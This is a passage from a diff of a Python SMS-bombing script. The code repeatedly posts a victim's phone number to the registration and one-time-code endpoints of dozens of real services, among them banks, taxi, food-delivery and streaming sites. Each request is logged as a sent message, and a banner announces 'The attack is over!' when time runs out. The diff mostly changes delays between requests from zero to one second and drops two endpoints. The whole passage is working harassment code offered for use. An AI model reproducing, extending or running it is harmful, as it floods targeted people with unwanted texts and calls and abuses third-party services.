         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10537,7 +10197,7 @@ if call == str(2):
                           data={'aj': '50', 'registration-phone': _phone})
             R = R + 1
             print('[+] StarPizzaCafe Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10549,7 +10209,7 @@ if call == str(2):
                           data={'phone_number': _phone}, headers={})
             R = R + 1
             print('[+] Tinder Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
 
@@ -10562,7 +10222,7 @@ if call == str(2):
             requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
             R = R + 1
             print('[+] Tinkoff Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10574,7 +10234,7 @@ if call == str(2):
             requests.post('https://dostavista.ru/backend/send-verification-sms', data={"phone": _phone})
             R = R + 1
             print('[+] Dostavista Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10587,7 +10247,7 @@ if call == str(2):
             requests.post('https://www.monobank.com.ua/api/mobapplink/send', data={"phone": "+" + _phone})
             R = R + 1
             print('[+] MonoBank Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10599,7 +10259,7 @@ if call == str(2):
             requests.post('https://widgets.binotel.com/getcall/call/', {"status": "success", "GetCallID": 13302425})
             R = R + 1
             print('[+] binotel Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10611,7 +10271,7 @@ if call == str(2):
                          data={"phone": _phone})
             R = R + 1
             print('[+] SportMaster Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10623,7 +10283,7 @@ if call == str(2):
             requests.post('https://alfalife.cc/auth.php', data={"phone": _phone})
             R = R + 1
             print('[+] Alfalife Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10634,7 +10294,7 @@ if call == str(2):
             requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
             R = R + 1
             print('[+] KoronaPay Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
 
@@ -10648,7 +10308,7 @@ if call == str(2):
                                 "oferta": "on", })
             R = R + 1
             print('[+] GGbet Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10661,7 +10321,7 @@ if call == str(2):
                                 "getSysParam": "yes", })
             R = R + 1
             print('[+] ETM Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10673,7 +10333,7 @@ if call == str(2):
             requests.post('https://thehive.pro/auth/signup', json={"phone": "+" + _phone, })
             R = R + 1
             print('[+] TheLive Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10684,7 +10344,7 @@ if call == str(2):
             requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
             R = R + 1
             print('[+] MTS Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10695,7 +10355,7 @@ if call == str(2):
             requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone})
             R = R + 1
             print('[+] MyGames Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10709,7 +10369,7 @@ if call == str(2):
                                 "phone": (_phone, "+* (***) ***-**-**"), "email": _email, "city": "Москва", })
             R = R + 1
             print('[+] Zoloto585 Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10720,7 +10380,7 @@ if call == str(2):
             requests.post('https://kasta.ua/api/v2/login/', data={"phone": _phone})
             R = R + 1
             print('[+] Kasta Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10732,7 +10392,7 @@ if call == str(2):
                           data={"RECALL": "Y", "BACK_CALL_PHONE": _phone})
             R = R + 1
             print('[+] Тaxi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10745,7 +10405,7 @@ if call == str(2):
                           json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email", })
             R = R + 1
             print('[+] Mail.ru Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10757,7 +10417,7 @@ if call == str(2):
                           json={"phone": (_phone, "+* (***) ***-**-**"), "type": "register", })
             R = R + 1
             print('[+] Creditter Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10773,7 +10433,7 @@ if call == str(2):
                                 "SecondName": _name, "Phone": _phone, "Email": _email, })
             R = R + 1
             print('[+] Ingos Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10786,7 +10446,7 @@ if call == str(2):
                                 "email": "", "lang": "en", })
             R = R + 1
             print('[+] Admiralxxx Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10797,7 +10457,7 @@ if call == str(2):
             requests.post('https://oauth.av.ru/check-phone', json={"phone": (_phone, "+* (***) ***-**-**")})
             R = R + 1
             print('[+] Av Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10809,7 +10469,7 @@ if call == str(2):
                           params={"msisdn": _phone})
             R = R + 1
             print('[+] MTS Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10820,7 +10480,7 @@ if call == str(2):
             requests.post('https://city24.ua/personalaccount/account/registration', data={"PhoneNumber": _phone})
             R = R + 1
             print('[+] City24 Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10831,7 +10491,7 @@ if call == str(2):
             requests.post('https://client-api.sushi-master.ru/api/v1/auth/init', json={"phone": _phone})
             R = R + 1
             print('[+] SushiMaster Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10842,7 +10502,7 @@ if call == str(2):
             requests.post('https://auth.multiplex.ua/login', json={"login": _phone})
             R = R + 1
             print('[+] MultiPlex Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10853,7 +10513,7 @@ if call == str(2):
             requests.post('https://3040.com.ua/taxi-ordering', data={"callback-phone": _phone})
             R = R + 1
             print('[+] 3040 Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10865,7 +10525,7 @@ if call == str(2):
                           data={"REGISTER[PERSONAL_PHONE]": _phone, "code": "", "sendsms": "Выслать код", })
             R = R + 1
             print('[+] Niyama Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10876,7 +10536,7 @@ if call == str(2):
             requests.post('https://shop.vsk.ru/ajax/auth/postSms/', data={"phone": _phone})
             R = R + 1
             print('[+] VSK Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10887,7 +10547,7 @@ if call == str(2):
             requests.post('https://api.easypay.ua/api/auth/register', json={"phone": _phone, "password": _password})
             R = R + 1
             print('[+] EasyPay Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10899,7 +10559,7 @@ if call == str(2):
                           data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
             R = R + 1
             print('[+] Fix-Price Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
 
@@ -10911,7 +10571,7 @@ if call == str(2):
             requests.post('https://msk.tele2.ru/api/validation/number/' + _phone, json={"sender": "Tele2"})
             R = R + 1
             print('[+] Tele2 Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10922,7 +10582,7 @@ if call == str(2):
             requests.get('https://www.finam.ru/api/smslocker/sendcode', data={"phone": "+" + _phone})
             R = R + 1
             print('[+] Finam Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10934,7 +10594,7 @@ if call == str(2):
                           params={"cb_fio": _name, "cb_phone": format(_phone, "+* *** *** ** **")})
             R = R + 1
             print('[+] MakiMaki Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10948,7 +10608,7 @@ if call == str(2):
                           json={"loginId": "+" + _phone, "supportAllStates": True})
             R = R + 1
             print('[+] FlipKart Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10959,7 +10619,7 @@ if call == str(2):
             requests.post('https://secure.online.ua/ajax/check_phone/', params={"reg_phone": _phone})
             R = R + 1
             print('[+] Online.ua Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10970,7 +10630,7 @@ if call == str(2):
             requests.post('https://cabinet.planetakino.ua/service/sms', params={"phone": _phone})
             R = R + 1
             print('[+] PlanetaKino Was sent!')
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10982,7 +10642,7 @@ if call == str(2):
                           json={"country": _codes[_code].upper(), "phone": _phone, })
             R = R + 1
             print('[+] OnTaxi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10993,7 +10653,7 @@ if call == str(2):
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
             R = R + 1
             print('[+] Iqos Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11005,7 +10665,7 @@ if call == str(2):
                           json={"mobile": "+" + _phone, "action": "confirm_mobile"})
             R = R + 1
             print('[+] Smart.Space Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
 
@@ -11019,7 +10679,7 @@ if call == str(2):
                                 'phone': _phone})
             R = R + 1
             print('[+] tarantino-family Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11035,7 +10695,7 @@ if call == str(2):
                                 "utc_offset": "120", })
             R = R + 1
             print('[+] Apteka Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11047,7 +10707,7 @@ if call == str(2):
                           headers={"client_id": "6289de851fc726f887af8d5d7a56c635"}, json={"phone": _phone})
             R = R + 1
             print('[+] Uklon Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11059,7 +10719,7 @@ if call == str(2):
                           json={"phone": _phone, "otpId": 0})
             R = R + 1
             print('[+] Ozon Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11072,7 +10732,7 @@ if call == str(2):
                                  "gorod": "Москва", "approving_data": "1", })
             R = R + 1
             print('[+] Banki Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11083,7 +10743,7 @@ if call == str(2):
             requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
             R = R + 1
             print('[+] IVI Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11095,7 +10755,7 @@ if call == str(2):
                           data={"firstname": _name, "phone": _phone, "email": _email})
             R = R + 1
             print('[+] Moyo Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11106,7 +10766,7 @@ if call == str(2):
             requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
             R = R + 1
             print('[+] Helsi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11118,7 +10778,7 @@ if call == str(2):
                           json={"Phone": _phone, "Type": 1})
             R = R + 1
             print('[+] KinoLend Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11131,7 +10791,7 @@ if call == str(2):
                                 '_token': '*'})
             R = R + 1
             print('[+] PizzaHut Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11143,7 +10803,7 @@ if call == str(2):
             requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
             R = R + 1
             print('[+] Rabota Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11154,7 +10814,7 @@ if call == str(2):
             requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
             R = R + 1
             print('[+] Rutube Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Rutube in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11165,7 +10825,7 @@ if call == str(2):
             requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
             R = R + 1
             print('[+] Citilink Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11177,7 +10837,7 @@ if call == str(2):
                           data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
             R = R + 1
             print('[+] Smsint Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11189,7 +10849,7 @@ if call == str(2):
                 'https://www.oyorooms.com/api/pwa/generateotp?phone=' + _phone9 + '&country_code=%2B7&nod=4&locale=en')
             R = R + 1
             print('[+] oyorooms Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11202,7 +10862,7 @@ if call == str(2):
                           data={"phone": _phone, "recaptcha": "off", "g-recaptcha-response": "", })
             R = R + 1
             print('[+] MVIDEO Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11215,7 +10875,7 @@ if call == str(2):
                                                               'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
             R = R + 1
             print('[+] newnext Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11226,7 +10886,7 @@ if call == str(2):
             requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
             R = R + 1
             print('[+] Sunlight Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11239,7 +10899,7 @@ if call == str(2):
                                 'deliveryOption': 'sms'})
             R = R + 1
             print('[+] alpari Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11250,7 +10910,7 @@ if call == str(2):
             requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
             R = R + 1
             print('[+] Invitro Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11263,7 +10923,7 @@ if call == str(2):
                                 'params': {'phone': _phone}, 'id': '1'})
             R = R + 1
             print('[+] Sberbank Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
 
@@ -11276,7 +10936,7 @@ if call == str(2):
                           params={"msisdn": _phone})
             R = R + 1
             print('[+] MTS Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11288,7 +10948,7 @@ if call == str(2):
                           data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
             R = R + 1
             print('[+] Delitime Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11300,7 +10960,7 @@ if call == str(2):
                           json={"phone": {"code": 1, "number": _phone}})
             R = R + 1
             print('[+] Guru Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11313,7 +10973,7 @@ if call == str(2):
                                 "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
             R = R + 1
             print('[+] ICQ Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11326,7 +10986,7 @@ if call == str(2):
                                 "v": 3, "appversion": "3.20.6", "osversion": "unknown", "devicemodel": "unknown"})
             R = R + 1
             print('[+] InDriver Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11338,7 +10998,7 @@ if call == str(2):
                           data={"password": password, "application": "lkp", "login": "+" + _phone})
             R = R + 1
             print('[+] Invitro Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11349,7 +11009,7 @@ if call == str(2):
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
             R = R + 1
             print('[+] Pmsm Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11360,7 +11020,7 @@ if call == str(2):
             requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
             R = R + 1
             print('[+] IVI Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11371,7 +11031,7 @@ if call == str(2):
             requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
             R = R + 1
             print('[+] Lenta Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11383,7 +11043,7 @@ if call == str(2):
                           json={"phone": "+" + _phone, "api": 2, "email": "email", "x-email": "x-email"})
             R = R + 1
             print('[+] Mail.ru Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11396,7 +11056,7 @@ if call == str(2):
                           data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
             R = R + 1
             print('[+] MVideo Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11408,33 +11068,10 @@ if call == str(2):
                           data={"st.r.phone": "+" + _phone})
             R = R + 1
             print('[+] OK Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
-            R = R + 1
-            print('[+] qlean Was sent! || Count - ' + str(R))
-            time.sleep(0)
-        except:
-            print('[-] Error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("The attack is over! Press ENTER to close...")
-            break
-        try:
-            requests.post('https://sso.cloud.qlean.ru/http/users/requestotp',
-                          headers={"Referer": "https://qlean.ru/sso?redirectUrl=https://qlean.ru/"},
-                          params={"phone": _phone, "clientId": "undefined", "sessionId": str(randint(5000, 9999))})
-            R = R + 1
-            print('[+] Qlean Was sent! || Count - ' + str(R))
-            time.sleep(0)
-        except:
-            print('[-] Error in sent!')
+
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("The attack is over! Press ENTER to close...")
@@ -11443,7 +11080,7 @@ if call == str(2):
             requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
             R = R + 1
             print('[+] SMSgorod Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11468,7 +11105,7 @@ if call == str(2):
                                 "password": password, "phone_number": _phone, "username": username})
             R = R + 1
             print('[+] Twitch Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11480,7 +11117,7 @@ if call == str(2):
                           headers={'App-ID': 'cabinet'})
             R = R + 1
             print('[+] CabWiFi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11491,7 +11128,7 @@ if call == str(2):
             requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
             R = R + 1
             print('[+] wowworks Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11503,7 +11140,7 @@ if call == str(2):
                           json={"phone_number": "+" + _phone})
             R = R + 1
             print('[+] Eda.Yandex Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11514,7 +11151,7 @@ if call == str(2):
             requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
             R = R + 1
             print('[+] Youla Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11527,7 +11164,7 @@ if call == str(2):
                                 "deliveryOption": "sms"})
             R = R + 1
             print('[+] Alpari Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11538,7 +11175,7 @@ if call == str(2):
             requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
             R = R + 1
             print('[+] SMS Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11549,7 +11186,7 @@ if call == str(2):
             requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
             R = R + 1
             print('[+] Delivery Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11562,14 +11199,14 @@ if call == str(2):
                                  "gorod": "Москва", "approving_data": "1", })
             R = R + 1
             print('[+] Banki Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         try:
             requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6', data={"phone": _phone})
             R = R + 1
             print('[+] IVI Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11581,7 +11218,7 @@ if call == str(2):
                           data={"firstname": _name, "phone": _phone, "email": _email})
             R = R + 1
             print('[+] Moyo Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11592,7 +11229,7 @@ if call == str(2):
             requests.post('https://helsi.me/api/healthy/accounts/login', json={"phone": _phone, "platform": "PISWeb"})
             R = R + 1
             print('[+] Helsi Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11604,7 +11241,7 @@ if call == str(2):
                           json={"Phone": _phone, "Type": 1})
             R = R + 1
             print('[+] KinoLend Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11617,7 +11254,7 @@ if call == str(2):
                                 '_token': '*'})
             R = R + 1
             print('[+] PizzaHut Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11628,7 +11265,7 @@ if call == str(2):
             requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
             R = R + 1
             print('[+] Rabota Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11639,7 +11276,7 @@ if call == str(2):
             requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
             R = R + 1
             print('[+] Rutube Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Rutube in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11650,7 +11287,7 @@ if call == str(2):
             requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
             R = R + 1
             print('[+] Citilink Was sent! || Count - ' + str(R))
-            time.sleep(0)
+            time.sleep(1)
         except:
             print('[-] Error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -11662,7 +11299,7 @@ if call == str(2):
                           data={'name': _name, 'phone': _phone, 'promo': 'yellowforma'})
             R = R + 1
